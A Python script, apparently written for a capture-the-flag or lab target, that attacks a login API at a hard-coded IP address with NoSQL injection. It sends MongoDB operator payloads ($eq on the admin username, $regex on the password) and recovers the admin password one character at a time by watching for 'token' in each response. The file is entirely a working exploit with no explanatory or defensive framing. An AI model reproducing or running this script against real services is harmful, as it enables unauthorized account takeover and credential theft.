import requests
import re
import string
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

tegex_string = 'token'

special = ''

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Define the URL and headers
url = 'http://83.136.254.158:39406/api/login'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Content-type': 'application/json',
}

def send_request(payload):
    try:
        response = requests.post(url, json=payload, headers=headers, proxies=proxies)
        response.raise_for_status()  # Raise an error for bad status codes
        return response.text
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
        return None

def search_response(response_text, search_string):
    if re.search(search_string, response_text):
        logger.info(f"Found string '{search_string}' in the response.")
        return True
    else:
        logger.info(f"Did not find string '{search_string}' in the response.")
        return False

def test_attribute(test_value):
    payload = {
    "username": {"$eq": "admin"},
    "password": {"$regex": f"^{test_value}"}
}
    response_text = send_request(payload)
    return search_response(response_text, tegex_string)

def exfiltrate_attribute():
    exfiltrated_value = ""
    iteration = 1
    characters = string.digits + string.ascii_lowercase + string.ascii_uppercase + special  # Using only digits for brute-forcing
    while True:
        found = False
        logger.info(f"[*] Starting iteration {iteration}: Current exfiltrated value: '{exfiltrated_value}'")
        for char in characters:
            test_value = exfiltrated_value + char
            logger.info(f"[*] Testing character: '{char}' -> Current test value: '{test_value}'")
            if test_attribute(test_value):
                exfiltrated_value += char
                logger.info(f"[+] Found character '{char}': Exfiltrated value so far: '{exfiltrated_value}'")
                found = True
                break
        if not found:
            logger.info(f"[!] No more characters found. Exfiltration complete.")
            logger.info(f"[+] Finished exfiltrating: {exfiltrated_value}")
            break
        iteration += 1

    return exfiltrated_value

if __name__ == "__main__":
    logger.info("[*] Starting attribute exfiltration process...")
    description_value = exfiltrate_attribute()
    logger.info(f"[+] Exfiltrated {tegex_string}: {description_value}")